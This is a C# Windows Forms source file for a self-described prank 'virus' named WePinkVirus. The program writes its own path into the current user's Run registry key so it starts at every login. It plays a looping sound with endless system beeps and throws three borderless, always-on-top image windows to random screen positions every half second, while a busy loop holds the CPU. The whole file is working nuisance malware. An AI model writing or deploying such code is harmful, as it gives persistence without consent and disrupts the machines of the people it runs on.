using Microsoft.Win32;
using System;
using System.Media;
using System.Windows.Forms;

namespace WePinkVirus
{
    internal static class Program
    {
        static void Main()
        {
            ApplicationConfiguration.Initialize();

            Task.Run(() => {
                AutoRun();
            });

            Task.Run(() => {
                soundloop();
            });
            formflash();
            while (true) { }
        }

        static void AutoRun()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey.SetValue("ApplicationName", Application.ExecutablePath);

        }

        static void formflash()
        {
            Form form = new Form();
            Form form2 = new Form();
            Form form3 = new Form();

            form.TopMost = true;
            form2.TopMost = true;
            form3.TopMost = true;

            form.FormBorderStyle = FormBorderStyle.None;
            form2.FormBorderStyle = FormBorderStyle.None;
            form3.FormBorderStyle = FormBorderStyle.None;

            form.BackgroundImage = Properties.Resources.felca;
            form2.BackgroundImage = Properties.Resources.virginia;
            form3.BackgroundImage = Properties.Resources.wepink;

            form.BackgroundImageLayout = ImageLayout.Stretch;
            form2.BackgroundImageLayout = ImageLayout.Stretch;
            form3.BackgroundImageLayout = ImageLayout.Stretch;

            form.Width += 100;
            form2.Width += 100;
            form3.Width += 100;

            form.Height += 100;
            form2.Height += 100;
            form3.Height += 100;

            form.Show();
            form2.Show();
            form3.Show();

            Random r = new Random();
            Screen screen = Screen.PrimaryScreen;
            Rectangle bounds = screen.Bounds;

            while (true)
            {
                form.Location = new Point(r.Next(bounds.Left, bounds.Right - form.Width), r.Next(bounds.Top, bounds.Bottom));
                form2.Location = new Point(r.Next(bounds.Left, bounds.Right - form.Width), r.Next(bounds.Top, bounds.Bottom));
                form3.Location = new Point(r.Next(bounds.Left, bounds.Right - form.Width), r.Next(bounds.Top, bounds.Bottom));

                Thread.Sleep(500);
            }
        }

        static void soundloop()
        {
            System.Media.SoundPlayer player = new System.Media.SoundPlayer(Properties.Resources.base_sound);
            player.PlayLooping();

            while (true)
            {
                SystemSounds.Beep.Play();
            }
        }
    }
}